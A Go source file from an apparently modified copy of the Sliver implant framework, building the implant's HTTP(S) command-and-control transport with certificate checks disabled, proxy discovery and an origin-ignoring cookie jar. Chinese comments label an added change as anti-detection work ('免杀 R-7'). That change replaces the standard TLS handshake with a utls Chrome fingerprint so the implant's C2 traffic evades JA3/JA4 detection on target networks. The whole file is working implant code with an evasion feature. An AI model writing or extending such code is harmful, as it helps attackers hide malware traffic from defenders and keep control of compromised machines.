package httpclient

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"crypto/tls"
	"net"
	"net/http"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	"4zreco/var/sliver/implant/sliver/cryptography"
	// {{end}}

	utls "github.com/refraction-networking/utls"

	"4zreco/var/sliver/implant/sliver/proxy"
)

// GoHTTPDriver - Pure Go HTTP driver
func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
	var transport *http.Transport
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // We don't care about the HTTP(S) layer certs
	}
	// {{if .Config.Debug}}
	if cryptography.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
	}
	// {{end}}
	if !secure {
		transport = &http.Transport{
			IdleConnTimeout:     time.Millisecond,
			Dial:                proxy.Direct.Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
		}
	} else {
		transport = &http.Transport{
			IdleConnTimeout: time.Millisecond,
			Dial: (&net.Dialer{
				Timeout: opts.NetTimeout,
			}).Dial,
			TLSHandshakeTimeout: opts.TlsTimeout,
			TLSClientConfig:     tlsConfig,
			// 免杀 R-7：HTTPS C2 面改用 utls 定制 ClientHello（Chrome 指纹，
			// 方案：docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md）——
			// Go 原生 crypto/tls 的 ClientHello 扩展顺序可被 JA3/JA4 稳定指纹化。
			// 证书不校验的口径与原实现一致；mTLS 通道不在本项范围（见方案边界）。
			DialTLSContext: utlsDialContext(tlsConfig, opts.TlsTimeout),
		}
	}
	transport.ProxyConnectHeader = http.Header{
		"User-Agent": []string{userAgent},
	}
	client := &http.Client{
		Jar:       cookieJar(),
		Timeout:   opts.NetTimeout,
		Transport: transport,
	}
	parseProxyConfig(origin, transport, opts.ProxyConfig)
	return client, nil
}

func parseProxyConfig(origin string, transport *http.Transport, proxyConfig string) {
	switch proxyConfig {
	case "never":
		break
	case "":
		fallthrough
	case "auto":
		p := proxy.NewProvider("").GetHTTPSProxy(origin)
		if p != nil {
			// {{if .Config.Debug}}
			log.Printf("Found proxy %#v\n", p)
			// {{end}}
			proxyURL := p.URL()
			if proxyURL.Scheme == "" {
				proxyURL.Scheme = "https"
			}
			// {{if .Config.Debug}}
			log.Printf("Proxy URL = '%s'\n", proxyURL)
			// {{end}}
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	default:
		// {{if .Config.Debug}}
		log.Printf("Force proxy %#v\n", proxyConfig)
		// {{end}}
		proxyURL, err := url.Parse(proxyConfig)
		if err != nil {
			break
		}
		if proxyURL.Scheme == "" {
			proxyURL.Scheme = "https"
		}
		// {{if .Config.Debug}}
		log.Printf("Proxy URL = '%s'\n", proxyURL)
		// {{end}}
		transport.Proxy = http.ProxyURL(proxyURL)
	}
}

// Jar - CookieJar implementation that ignores domains/origins
type Jar struct {
	lk      sync.Mutex
	cookies []*http.Cookie
}

func cookieJar() *Jar {
	return &Jar{
		lk:      sync.Mutex{},
		cookies: []*http.Cookie{},
	}
}

// NewJar - Get a new instance of a cookie jar
func NewJar() *Jar {
	jar := new(Jar)
	jar.cookies = make([]*http.Cookie, 0)
	return jar
}

// SetCookies handles the receipt of the cookies in a reply for the
// given URL (which is ignored).
func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
	jar.lk.Lock()
	jar.cookies = append(jar.cookies, cookies...)
	jar.lk.Unlock()
}

// Cookies returns the cookies to send in a request for the given URL.
// It is up to the implementation to honor the standard cookie use
// restrictions such as in RFC 6265 (which we do not).
func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
	return jar.cookies
}

// utlsDialContext 免杀 R-7：以 utls Chrome 指纹完成 TLS 握手的 DialTLS 闭包。
// - HelloChrome_Auto：按 utls 内置的最新 Chrome ClientHello 指纹（含 GREASE 与
//   扩展顺序），对齐目标环境常见浏览器流量；
// - ALPN 仅声明 http/1.1：v1 与 sliver server 兼容优先（h2 升级需 transport 层
//   联动，列入后续精修）；JA3/JA4 的 ALPN 字段在此口径下为 http/1.1；
// - InsecureSkipVerify 与原 stdlib 实现口径一致（HTTP 层不校验证书）；
// - KeyLogWriter 透传（Debug 构建 wireshark 调试能力不回退）。
func utlsDialContext(tlsConfig *tls.Config, handshakeTimeout time.Duration) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		rawConn, err := (&net.Dialer{Timeout: handshakeTimeout}).DialContext(ctx, network, addr)
		if err != nil {
			return nil, err
		}
		host, _, splitErr := net.SplitHostPort(addr)
		if splitErr != nil {
			host = addr
		}
		cfg := &utls.Config{
			ServerName:         host,
			InsecureSkipVerify: tlsConfig.InsecureSkipVerify,
			NextProtos:         []string{"http/1.1"},
			MinVersion:         utls.VersionTLS12,
		}
		// {{if .Config.Debug}}
		cfg.KeyLogWriter = tlsConfig.KeyLogWriter
		// {{end}}
		// Chrome 预设指纹自带 h2 ALPN，会覆盖 cfg.NextProtos——而 UConn 不实现
		// stdlib ConnectionState 接口，http.Transport 无法升级 h2，协商出 h2 即
		// 协议错配。故经 UTLSIdToSpec + ApplyPreset 强改 ALPN 为 http/1.1
		//（v1 server 兼容优先；h2 联动列入后续精修）。
		uConn := utls.UClient(rawConn, cfg, utls.HelloCustom)
		spec, specErr := utls.UTLSIdToSpec(utls.HelloChrome_Auto)
		if specErr != nil {
			rawConn.Close()
			return nil, specErr
		}
		for i := range spec.Extensions {
			if alpn, ok := spec.Extensions[i].(*utls.ALPNExtension); ok {
				alpn.AlpnProtocols = []string{"http/1.1"}
				break
			}
		}
		if err := uConn.ApplyPreset(&spec); err != nil {
			rawConn.Close()
			return nil, err
		}
		hsCtx, cancel := context.WithTimeout(ctx, handshakeTimeout)
		defer cancel()
		if err := uConn.HandshakeContext(hsCtx); err != nil {
			rawConn.Close()
			return nil, err
		}
		return uConn, nil
	}
}
